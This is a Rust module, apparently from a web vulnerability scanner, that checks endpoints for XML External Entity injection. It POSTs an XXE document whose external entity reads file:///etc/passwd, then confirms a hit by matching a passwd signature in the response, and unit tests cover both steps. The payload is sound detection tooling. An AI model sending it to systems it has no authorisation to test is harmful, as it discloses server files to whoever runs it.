//! XML External Entity (XXE) injection (CWE-611) detection.
//!
//! Evidence-driven, in-band: an XML document declaring an external entity that
//! points at a local file (`file:///etc/passwd`) and references it in the body
//! is POSTed to the endpoint. A hit is confirmed only when the file's content
//! signature (`root:…:0:0:`) appears in the response — proof the parser resolved
//! the external entity and disclosed the file. Reflection of the payload alone
//! cannot reproduce the signature, so it cannot false-positive.

use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use anyhow::Result;
use lazy_static::lazy_static;
use regex::Regex;
use url::Url;

/// A confirmed XXE vector.
#[derive(Debug, Clone)]
pub struct XxeVector {
    pub file: &'static str,
    pub payload: String,
    pub content_type: &'static str,
}

lazy_static! {
    /// /etc/passwd content signature.
    static ref PASSWD: Regex = Regex::new(r"root:[^:]*:0:0:").unwrap();
}

/// Classic in-band XXE document reading a local file via an external entity.
fn payload(file: &str) -> String {
    format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
         <!DOCTYPE anvil [<!ENTITY xxe SYSTEM \"file:///{file}\">]>\n\
         <anvil>&xxe;</anvil>"
    )
}

/// Content types worth trying for an XML-consuming endpoint.
const CONTENT_TYPES: &[&str] = &["application/xml", "text/xml"];

/// Check an endpoint for in-band XXE.
pub async fn check_xxe(client: &HttpClient, url: &Url) -> Result<Option<XxeVector>> {
    let body = payload("etc/passwd");
    for ct in CONTENT_TYPES {
        let mut req = HttpRequest::post(url.clone(), body.clone());
        req.set_header("Content-Type", ct); // override the form default
        let resp = match client.execute(req).await {
            Ok(r) => r,
            Err(_) => continue,
        };
        if PASSWD.is_match(&resp.body_text()) {
            return Ok(Some(XxeVector {
                file: "etc/passwd",
                payload: body,
                content_type: ct,
            }));
        }
    }
    Ok(None)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payload_declares_an_external_file_entity() {
        let p = payload("etc/passwd");
        assert!(p.contains("<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"));
        assert!(p.contains("&xxe;"));
    }

    #[test]
    fn signature_matches_real_passwd_only() {
        assert!(PASSWD.is_match("root:x:0:0:root:/root:/bin/bash"));
        // a reflected payload (entity not resolved) must not match
        assert!(!PASSWD.is_match("<anvil>&xxe;</anvil>"));
    }
}
